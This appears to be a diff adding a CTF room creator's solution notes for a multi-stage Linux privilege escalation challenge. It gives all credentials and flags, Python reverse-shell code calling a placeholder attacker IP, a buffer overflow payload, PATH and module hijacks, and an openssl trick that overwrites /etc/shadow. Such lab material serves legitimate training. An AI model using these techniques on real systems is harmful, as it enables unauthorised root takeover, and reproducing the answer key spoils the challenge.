@@ -1,0 +1,155 @@
+Priv Esc Room
+
+Priv Esc Hard:
+    Creds:
+        user0:password
+        user1:I'm_H1dD3n
+        user2:I_@m_@_P@s$W0rd
+        user3:1$_iT_My_P@$s?
+        user4:F0uRTh_Us3R
+        root:H@Rd_b0X_L3@D3r
+    user1:
+	Rabbit hole: /home/user1/movie.txt
+		=> Decode: base58
+        Intended path: Enumeration apache2 subdomain + file enumeration
+            netstat -plunt => http locally
+            ls -l /var/www => subdomains
+            cat /etc/hosts => get subdomains lists
+            Copy this list: remove beginning and end of file:
+            Keep only hostnames:
+                sed 's/127.0.0.1\t//' /etc/hosts > subdomains.txt
+            If you access localhost or wrong subdomain:
+                You receive "Nothing to see here"
+            Write a script: Example in python3:
+               "import requests
+                f = open("subdomains.txt", "r")
+                for x in f:
+                    req = requests.get("http://{}/".format(x[:-1]))
+                    content = str(req.content, 'utf-8')
+                    if "Nothing" not in content[:-1]:
+                        print(x[:-1] + ":",  content[:-1])
+                "
+                Output:
+                "draft.localhost: This is draft
+                secret.localhost: This is secret"
+            Rabbit hole: 
+                => draft.localhost
+            Enumeration secret.localhost:
+                => Import list on target machine (common.txt or medium.txt)
+                Write a script: Example in python3:
+                "import requests
+                f = open("common.txt", "r")
+                for x in f:
+                    req = requests.get("http://secret.localhost/{}".format(x[:-1]))
+                    content = str(req.content, 'utf-8')
+                    if "secret" not in content[:-1]:
+                        print(x[:-1] + ":",  content[:-1])
+                "
+            You get user1 credentials with http://secret.localhost/notes
+        Flag:
+            THM{3NuM3r@T10n_1$_Th3_K3y}
+    user2:
+	Rabbit hole: /home/user2/tyler.txt
+		=> Decode: hex => base64 
+        Rabbit hole: ssh key
+            Can be read but private key does not fit the public key
+        Intended path: Sudo + Python PATH Exploit
+            /home/user1/hanoi.py imports /usr/lib/python3.6/hanoi_moves.py
+            /home/user1/hanoi.py is immutable to avoid user1 to rm it and create another one
+            Exploit:
+                Create hanoi_moves.py in /home/user1 that spawns a reverse shell:
+                    "import socket
+                    import subprocess
+                    import os
+                    import pty
+                    def TowerOfHanoi(n, source, destination, auxiliary):
+                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                        s.connect(("<IP>",1234))
+                        os.dup2(s.fileno(),0)
+                        os.dup2(s.fileno(),1)
+                        os.dup2(s.fileno(),2)
+                        pty.spawn("/bin/bash")
+                    "
+                nc -lvnp <port> (attacker machine)
+                sudo -u user2 /usr/bin/python3 /home/user1/hanoi.py
+        Flag:
+            THM{PytH0n_P@Th_3Xpl01t@t10n}
+        Info:
+            user2 password is in a text file in case of fail attempt for next user
+    user3:
+        Rabbit hole: lee.txt
+            Vigenered encrypted: (password=bruce), can be brute forced online.
+        Intended path: Cronjob + Buffer overflow
+            root cronjob:
+                cd /home/user3/Project && /usr/bin/gcc -m32 -fno-stack-protector -no-pie -o main main.c libft.a && /bin/chown user3:user2 main && chmod 4750 main
+            /home/user3/Project/includes/ft.h: write permission + append only attribute:
+                Create file: for example, the file is called shell1.c:
+                    "#include <sys/types.h>
+                    #include <unistd.h>
+                    void	shell();"
+                cat shell1.c >> /home/user3/Project/includes/ft.h
+            main.c: append only attribute
+                Create file: for example, the file is called shell2.c:
+                "void shell()
+                {
+                    setreuid(1003,1003);
+                    system("/bin/bash");
+                }"
+                cat shell2.c >> /home/user3/Project/main.c
+            Wait for cronjob
+            Buffer overflow to get shell with user3 group:
+                gdb => EIP offset = 17
+                    Get shell memory address:
+                        info func (example: shell memory address = "0x080484fb")
+                To be executed outside gdb: (user3 group required for the next part)
+                    sudo -g user3 /home/user3/Project/main $(python -c "print 'A' * 17 + '\xfb\x84\x04\x08'")
+                        => user2 get user3 group (required for the following)
+        Flag:
+            THM{BuFbUfBuF_BuFf3R_0v3rFloOow}
+    user4:
+        Rabbit hole: SUID
+            /usr/bin/enigma_fourth
+                => result is fibonnacci result for given number
+            setreuid isnt set in program:
+                /bin/bash will been executed as user3
+        Intended path: SUID + PATH
+            /usr/local/bin/enigma_fourth
+                => result is fibonnacci result for given number
+                When appropriate result:
+                    execute: 
+                        setreuid(1004,1004);
+                        setregid(1004,1004); (you dont get users group, required for next step)
+                        system("echo 'Congratulations' `whoami | /bin/sed 's/4/3/'` '!' ");
+                Exploit cmd:
+                    export PATH=/tmp:$PATH
+                    create file "whoami" in /tmp
+                        "#!/bin/bash
+                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"
+                    chmod 777 /tmp/whoami
+                    Set up your nc listener
+                    Execute program and gives fibonnaci appropriate result
+        Flag:
+            THM{@n0Th3R_P@Th_EXpl01t@T1On}
+    root:
+        Intended path: openssl capabilities
+            getcap -r / 2> /dev/null
+                openssl =ep
+            openssl can only be used by "users" group:
+                => Need to generate ssh-private key and to login with it
+            Exploit needs 2 user4 accounts available:
+                With first user4:
+		    export PATH=/usr/share/openssl/:$PATH
+                    cd /tmp
+                    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+                    cd /
+                    openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1234 -HTTP
+                With second user4:
+		    export PATH=/usr/share/openssl/:$PATH
+                    curl -k "https://127.0.0.1:1234/etc/shadow"
+                    nano /tmp/shadow (or adapt command file name)
+                        Copy previous shadow file but change root password ()
+                    openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
+                    cd /tmp && openssl smime -decrypt -in shadow.enc -inform DER -inkey key.pem -out /etc/shadow
+                    su root with updated password
+        Flag:
+            THM{Y0u_R0cK,_C0nGr@TuLAt10n$!!!}
